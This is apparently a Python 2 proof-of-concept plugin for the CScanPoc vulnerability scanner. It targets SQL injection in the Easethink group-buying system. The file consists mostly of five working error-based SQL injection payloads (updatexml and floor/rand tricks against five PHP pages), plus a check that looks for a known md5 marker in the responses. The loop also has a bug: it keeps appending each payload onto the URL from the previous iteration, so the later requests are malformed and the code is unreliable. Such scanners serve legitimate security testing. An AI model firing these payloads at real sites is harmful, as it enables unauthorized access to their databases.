# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'Easethink_0000' # 平台漏洞编号，留空
    name = '易想团购管理系统 SQL注射' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2013-07-15'  # 漏洞公布时间
    desc = '''
        Easethink(易想团购管理系统)多个页面存在注入漏洞。
        /ajax.php
        /link.php
        /vote.php
        /subscribe.php
        /sms.php
    ''' # 漏洞描述
    ref = '' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=21971
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'Easethink(易想团购管理系统)'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '02418388-d49b-4126-9778-e798e92aa92e'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payloads = {
                '/ajax.php?act=check_field&field_name=a%27%20and(select%201%20from(select%20count(*),concat((select%20(select%20(select%20concat(0x7e,md5(123),0x7e)))%20from%20information_schema.tables%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)#',
                '/link.php?act=go&city=sanming&url=secer%27)%20and%20(updatexml(1,concat(0x3a,(select%20concat(md5(123))%20from%20jytuan_admin%20limit%201)),1))%23',
                '/vote.php?act=dovote&name[1 and (select 1 from(select count(*),concat(0x7c,md5(123),0x7c,floor(rand(0)*2))x from information_schema.tables group by x limit 0,1)a)%23][111]=aa',
                "/subscribe.php?act=unsubscribe&code=secer') and (updatexml(1,concat(0x3a,(select concat(md5(123)) from easethink_admin limit 1)),1))#",
                "/sms.php?act=do_unsubscribe_verify&mobile=a' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,md5(123),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#"
                }
            for payload in payloads:
                target_url = arg= arg + payload
                code, head, res,errcode,_ = hh.http(target_url)
                       
                if code == 200 and "202cb962ac59075b964b07152d234b70"in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()